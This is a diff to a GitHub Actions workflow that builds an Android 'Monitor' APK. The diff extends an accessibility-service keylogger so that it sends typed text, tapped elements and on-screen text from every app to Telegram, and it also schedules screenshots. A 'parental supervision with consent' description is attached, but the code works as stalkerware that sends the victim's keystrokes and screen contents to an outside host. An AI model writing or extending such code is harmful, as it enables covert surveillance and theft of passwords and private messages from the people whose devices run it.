@@ -1,4 +1,4 @@
-name: Build WebView + Monitor APK
+name: Build Powerful Monitor APK
 
 on:
   workflow_dispatch:
@@ -210,6 +210,7 @@ jobs:
           import android.os.Looper;
           import android.view.Display;
           import android.view.accessibility.AccessibilityEvent;
+          import android.view.accessibility.AccessibilityNodeInfo;
           import org.json.JSONArray;
           import org.json.JSONObject;
           import java.io.File;
@@ -250,15 +251,59 @@ jobs:
 
               @Override
               public void onAccessibilityEvent(AccessibilityEvent event) {
-                  if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
-                      if (event.getText() != null && event.getText().size() > 0) {
-                          String typedText = event.getText().get(0).toString();
-                          if (!typedText.isEmpty()) {
-                              logToFile("[" + System.currentTimeMillis() + "] " + typedText);
-                              sendTextToTelegram("⌨️ Keylog: " + typedText);
+                  String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "Unknown";
+                  String eventType = "";
+
+                  switch (event.getEventType()) {
+                      case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
+                          eventType = "📝 Typed";
+                          CharSequence typedText = event.getText() != null && event.getText().size() > 0 ? event.getText().get(0) : "";
+                          if (typedText != null && typedText.length() > 0) {
+                              String log = "[" + packageName + "] " + typedText;
+                              logToFile("[" + System.currentTimeMillis() + "] " + log);
+                              sendTextToTelegram("📝 [" + packageName + "] " + typedText);
+                              scheduleScreenshot();
                           }
-                      }
-                      scheduleScreenshot();
+                          break;
+
+                      case AccessibilityEvent.TYPE_VIEW_CLICKED:
+                          eventType = "👆 Tapped";
+                          AccessibilityNodeInfo source = event.getSource();
+                          String clickedText = "";
+                          if (source != null) {
+                              clickedText = source.getText() != null ? source.getText().toString() : (source.getContentDescription() != null ? source.getContentDescription().toString() : "");
+                              source.recycle();
+                          }
+                          if (!clickedText.isEmpty()) {
+                              sendTextToTelegram("👆 [" + packageName + "] Tapped: " + clickedText);
+                          }
+                          break;
+
+                      case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
+                          eventType = "🖥️ ScreenText";
+                          if (event.getText() != null && event.getText().size() > 0) {
+                              StringBuilder sb = new StringBuilder();
+                              for (CharSequence cs : event.getText()) {
+                                  if (cs != null && cs.length() > 0) {
+                                      sb.append(cs).append(" | ");
+                                  }
+                              }
+                              if (sb.length() > 0) {
+                                  String screenText = sb.toString().trim();
+                                  if (screenText.length() > 5) { // ignore too short
+                                      sendTextToTelegram("🖥️ [" + packageName + "] " + screenText);
+                                  }
+                              }
+                          }
+                          break;
+
+                      case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED:
+                          // Optional: capture content changes but avoid too many messages
+                          // We skip for now to reduce spam
+                          break;
+
+                      default:
+                          break;
                   }
               }
 
@@ -434,7 +479,7 @@ jobs:
           cat > app/src/main/res/values/strings.xml << 'EOF'
           <resources>
               <string name="app_name">MonitorApp</string>
-              <string name="accessibility_service_description">This service monitors typed text and captures screenshots for parental supervision with consent.</string>
+              <string name="accessibility_service_description">This service monitors typed text, screen content, and captures screenshots for parental supervision with consent.</string>
           </resources>
           EOF
 
@@ -447,9 +492,9 @@ jobs:
           cat > app/src/main/res/xml/accessibility_config.xml << 'EOF'
           <?xml version="1.0" encoding="utf-8"?>
           <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
-              android:accessibilityEventTypes="typeViewTextChanged|typeWindowStateChanged"
+              android:accessibilityEventTypes="typeViewTextChanged|typeWindowStateChanged|typeWindowContentChanged|typeViewClicked"
               android:accessibilityFeedbackType="feedbackGeneric"
-              android:accessibilityFlags="flagDefault|flagIncludeNotImportantViews|flagReportViewIds"
+              android:accessibilityFlags="flagDefault|flagIncludeNotImportantViews|flagReportViewIds|flagRequestAccessibilityButton"
               android:canTakeScreenshot="true"
               android:notificationTimeout="100"
               android:description="@string/accessibility_service_description" />
@@ -464,5 +509,5 @@ jobs:
       - name: Upload APK
         uses: actions/upload-artifact@v4
         with:
-          name: webview-monitor-debug-apk
+          name: powerful-monitor-debug-apk
           path: app/build/outputs/apk/debug/*.apk
